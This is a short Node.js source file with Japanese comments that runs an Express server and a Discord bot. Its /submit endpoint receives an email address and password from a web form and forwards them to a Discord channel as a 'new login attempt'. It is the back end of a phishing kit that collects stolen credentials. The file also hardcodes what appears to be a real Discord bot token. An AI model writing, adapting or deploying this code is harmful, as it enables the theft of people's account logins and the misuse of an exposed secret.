// 必要なモジュールをインポート
const express = require('express');
const { Client, GatewayIntentBits } = require('discord.js');

// サーバーの設定
const app = express();
app.use(express.json()); // JSONデータの受信を許可

// Discord Botのクライアントを作成
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });

// Botがオンラインになったときの処理
client.once('ready', () => {
  console.log('Bot is online!');
});

// DiscordのBotトークンを使ってログイン
client.login('MTM3MjE1NjkxNzMwNDEzNTg0NQ.GdM3bn.uSq76JNlf9WWsuaQ_wb9tAeFDDoeMi3jqNEQjs'); // 自分のBotトークンを設定

// メールアドレスとパスワードを受け取るエンドポイント
app.post('/submit', (req, res) => {
  const { email, password } = req.body; // フォームから送られたデータを受け取る

  // メールアドレスとパスワードをDiscordチャンネルに送信
  const channel = client.channels.cache.get('1372156830855200838'); // チャンネルIDを設定

  if (channel) {
    channel.send(`新しいログイン試行: メールアドレス: ${email}, パスワード: ${password}`);
    res.status(200).send({ message: 'データ送信成功' });
  } else {
    res.status(404).send({ message: 'チャンネルが見つかりません' });
  }
});

// サーバーを指定したポートで立ち上げる
app.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});
